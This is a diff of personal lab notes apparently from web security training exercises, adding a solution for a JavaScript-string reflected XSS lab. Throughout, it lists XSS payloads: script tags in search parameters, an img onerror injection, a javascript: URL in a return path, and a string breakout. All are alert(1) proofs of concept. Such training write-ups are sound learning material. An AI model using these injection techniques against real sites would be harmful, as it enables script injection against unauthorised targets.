@@ -9,8 +9,6 @@ To solve the lab, perform a cross-site scripting attack that calls the `alert`�
 
 ## Solution
 
-Very easy:
-
 ```
 /?search=hello<script>alert(1)</script>
 ```
@@ -30,8 +28,6 @@ Commenting:
 ```
 <script>alert(1)</script>
 ```
-
-solves the lab -> very easy
 
 # Lab 3
 
@@ -65,8 +61,6 @@ Payload from `Lab 3` didn't trigger, using a simple bypass solves this:
 /?search=werewr%27"><img+src=x+onerror=alert(1)>
 ```
 
-A closing `</div>` tag could maybe do the trick given there is no filtering in place? -> to be tested for knowledge.
-
 # Lab 5
 
 ## Description
@@ -76,8 +70,6 @@ This lab contains a DOM-based cross-site scripting vulnerability in the submit f
 To solve this lab, make the "back" link alert `document.cookie`.
 
 ## Solution
-
-Was too tired to understand why my payloads didn't work -> used `DOM Invader`:
 
 ```
 /feedback?returnPath=javascript:alert(1)
@@ -143,4 +135,28 @@ csrf=tlmKV3oBPeXwVbY9xnYqJHTgMMnELbLn&postId=3&comment=test&name=test&email=test
 ```
 
 The XSS triggers on visiting the link (located on the commenter's name).
+
+# Lab 9
+
+## Description
+
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+
+## Solution
+
+As the description suggest, the reflection occurs inside a JavaScript string which ignores `html` payloads:
+
+```
+<script>
+                        var searchTerms = 'test';
+                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                    </script>
+```
+
+breaking out of the `searchTerms` variable enables javascript execution:
+
+```
+search=test';alert(1);'
+```
+
 
